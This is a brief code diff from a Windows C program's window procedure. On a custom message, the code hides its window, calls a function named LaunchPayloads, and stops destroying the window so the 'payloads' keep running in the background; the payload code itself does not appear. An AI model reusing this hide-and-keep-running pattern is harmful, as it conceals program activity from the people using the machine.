@@ -291,8 +291,9 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
     case WM_USER + 101: {
         ShowWindow(hWnd, SW_HIDE);
+        // Launch payloads THEN delay destroy so they have time to start
         LaunchPayloads();
-        DestroyWindow(hWnd);
+        // DestroyWindow(hWnd);  // Removed - let payloads run in background
         break;
     }
     case WM_CLOSE: {
